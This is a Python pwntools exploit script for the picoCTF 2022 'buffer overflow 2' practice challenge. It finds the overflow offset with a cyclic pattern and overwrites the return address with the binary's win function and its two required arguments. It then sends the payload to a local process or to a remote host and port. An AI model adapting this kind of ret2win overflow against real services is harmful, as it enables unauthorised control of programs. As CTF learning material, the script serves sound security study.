from pwn import *
import argparse

"""
Pico CTF 2022 buffer overflow 2 - thankx to John Hammond for this.
explore yourself the ctf : https://play.picoctf.org/practice/challenge/259?category=6&originalEvent=70&page=1
"""
cgen = cyclic_gen()
cpayload = cgen.get(250)

parser = argparse.ArgumentParser()
parser.add_argument("dest", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)
args = parser.parse_args()

print(args.dest)

elf = ELF('./vuln')

win_func_location = p32(elf.symbols["win"])
ret_main = p32(elf.symbols["main"])

cafefood = p32(0xCAFEF00D)
foodfood = p32(0xF00DF00D)
print(win_func_location)

print(f"payload: {cpayload}")
offset = cpayload.find(b'daab')
print(f"offset: {offset}")


payload = b"".join(
    [
        b'A' * offset,
        win_func_location,
        ret_main,
        cafefood,
        foodfood
    ]
)

with open("payload", "wb") as filep:
    filep.write(payload)

if args.dest == "local":
    p = elf.process()
    # g = gdb.attach(p, gdbscript="""
    #     b *win
    #     r < payload
                    
    # """)

    # print(p.recv().decode('utf-8'))
if args.dest == "remote":
    if not args.target or not args.port:
        warning("Supply --target and --port")
        exit()
    p = remote(args.target, args.port)
p.sendline(payload) 
p.interactive()

